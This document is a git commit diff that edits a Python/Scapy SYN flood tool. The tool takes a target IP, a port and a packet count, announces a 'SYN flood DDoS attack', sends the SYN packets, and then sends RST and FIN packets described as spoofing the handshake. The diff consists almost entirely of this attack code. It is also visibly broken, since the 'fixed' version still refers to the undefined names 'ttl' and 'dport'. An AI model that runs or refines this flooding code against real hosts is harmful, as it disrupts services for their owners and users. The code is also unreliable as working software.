abbe354bf55c754d74438cbf59f4078dd133e46e
Kaleb Horvath <bobafett2021@hotmail.com>
2018-11-01 13:19:16 -1000

    fixed bugs in flood command

--- flood/__main__.py
+++ flood/__main__.py
@@ -10,17 +10,15 @@ def get_arguments():
                 help="Target IP.")
 	parser.add_option("-p", "--port", dest="port",
 		help="Port to flood (80).")
-	parser.add_option("-ttl", "--time-to-live,", dest="ttl",
-		help="Time-to-live for network layer (20).")
 	parser.add_option("-l", "--payload", dest="payload",
 		help="Amount of SYN packets to send (65000).")
         options, arguments = parser.parse_args()
         return options
 
 # function to perform the flood
-def flood (victimp_ip, port, ttl, payload):
- 	SYNpkt = IP(dst=victim_ip, ttl=ttl)/
-		TCP(sport=1500, dport=port, flags="S")
+def flood (victim_ip, port, payload):
+ 	SYNpkt = IP(dst=victim_ip, ttl=20)
+ 	tcp = TCP(sport=1500, dport=port, flags="S")
 
 	print("\nStarting SYN flood DDoS attack...")
 	# number of packets according to payload
@@ -30,35 +28,31 @@ def flood (victimp_ip, port, ttl, payload):
 
 		print("Sent packet: %i" % counter)
 		# actually send the packet
-		send(SYNpkt, verbose=0)
+		send(SYNpkt/tcp, verbose=0)
 
 	# after you send all SYN, send an RST and FIN
 	# to ensure the connection is closed
-	RSTpkt = IP(dst=victim_ip, ttl=ttl)/
-		TCP(sport=1500, dport=dport,
-		flags="R")
-	FINpkt = IP(dst=victim_ip, ttl=ttl)/
-                TCP(sport=1500, dport=dport,
-                flags="F")
+	RSTpkt = TCP(sport=1500, dport=int(dport), flags="R")
+	FINpkt = TCP(sport=1500, dport=int(dport),flags="F")
 
 
 	print("Sending RST packet to reset...")
-	send(RSTpkt, verbose=0) # reset connection
+	send(IP(dst=victim_ip, ttl=ttl)/RSTpkt, verbose=0) # reset connection
 
 	print("Sending FIN to end connection...")
-	send(FINpkt, verbose=0) # assure victim
+	send(IP(dst=victim_ip, ttl=ttl)/FINpkt, verbose=0) # assure victim
 	# that we have no more business with them
 	# effectively spoofing our
 	# entire previous handshake
 
 
 options = get_arguments()
-ttl = options.ttl; target = options.target
-port = options.port; payload = options.payload
+target = options.target
+port = int(options.port); payload = int(options.payload)
 
 try:
         # call the flood function which will do all the required printing
-        flood(target, port, ttl, payload)
+        flood(target, port, payload)
 except KeyboardInterrupt as interrupt:
         print("Quitting...")
         sys.exit(0) # quit and raise no error
